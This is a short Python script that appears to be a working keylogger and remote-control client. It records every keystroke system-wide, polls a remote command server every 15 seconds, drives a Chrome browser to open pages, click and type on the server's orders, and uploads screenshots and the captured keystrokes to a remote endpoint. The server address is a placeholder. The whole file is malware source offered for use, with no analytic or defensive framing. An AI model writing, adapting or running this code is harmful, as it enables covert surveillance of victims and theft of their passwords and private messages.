import requests, time
from helium import start_chrome, click, write, kill_browser
import keyboard

SERVER_URL = "https://ur server url/commands"
UPLOAD_URL = "https://ur server url/upload"
KEYLOG_PATH = "keylog.txt"
keylogs = ""

def log_keys(e):
    global keylogs
    keylogs += e.name + ' '

keyboard.on_press(log_keys)

driver = None

while True:
    try:
        response = requests.get(SERVER_URL)
        command = response.json()

        if command.get('action') == "open_url":
            if driver:
                kill_browser()
            driver = start_chrome(command['url'])

        elif command.get('action') == "click":
            if driver:
                click(command['element'])

        elif command.get('action') == "type":
            if driver:
                write(command['text'])

        elif command.get('action') == "close":
            if driver:
                kill_browser()
                driver = None

        elif command.get('action') == "screenshot":
            if driver:
                screenshot_path = "screen.png"
                driver.save_screenshot(screenshot_path)
                with open(screenshot_path, "rb") as f:
                    requests.post(UPLOAD_URL, files={"file": f})

        elif command.get('action') == "send_keylogs":
            with open(KEYLOG_PATH, "w") as f:
                f.write(keylogs)
            with open(KEYLOG_PATH, "rb") as f:
                requests.post(UPLOAD_URL, files={"file": f})

        # Clear the command after execution
        requests.post("https://ur server url/setcommand", json={})

    except Exception as e:
        print("Error:", e)

    time.sleep(15)
